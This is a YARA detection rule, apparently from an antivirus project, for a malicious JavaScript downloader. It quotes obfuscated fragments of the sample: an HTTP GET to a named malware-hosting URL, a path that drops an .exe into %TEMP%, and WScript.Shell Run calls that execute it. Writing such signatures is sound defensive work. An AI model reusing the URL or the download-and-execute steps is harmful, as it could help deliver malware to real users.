rule sig_20160329_2e3fba1ad79081c07ab77dce8767096e {
  meta:
    description = "datamaliciousorder - file 20160329_2e3fba1ad79081c07ab77dce8767096e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a092a6457aad5787b3f05d0b098ef9b55b643eb5e7ac4c4ffa1d08692bc8dbf1"

  strings:
    $s1  = "sR[Rd](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function X() {return W0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WFZFDYFM8nW6kC1.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[W](u() * 11); if (sR[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var W0 = function rS() {return WScript[km](\"WScript.Shell\");}(), s = 11;" fullword ascii
    $s5  = "function rL(tx, zM){Ua = Ua * 1; return tx - zM;};" fullword ascii
    $s6  = "function MS(){return \"\" + Nv;};" fullword ascii
    $s7  = "function v(rl){W0[\"Run\"](rl, Ua, Ua);};" fullword ascii
    $s8  = "function ZI() {return ((s0 == true) && (s0 == we)) ? 1 : Ua;};" fullword ascii
    $s9  = "function u(){return 22;};" fullword ascii
    $s10 = "function fn()" fullword ascii
    $s11 = "function SY(fb) {var Vd = (1, 2, 3, 4, 5, fb); return Vd;};" fullword ascii
    $s12 = "return rL(lU, X0);" fullword ascii
    $s13 = " while (rD){" fullword ascii
    $s14 = "function sJ(){return km;};" fullword ascii
    $s15 = "var J = new this[\"Date\"]();" fullword ascii
    $s16 = "s0 = true; " fullword ascii
    $s17 = "var s0 = false;" fullword ascii
    $s18 = "we = true; " fullword ascii
    $s19 = "var we = false;" fullword ascii
    $s20 = "var Tu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}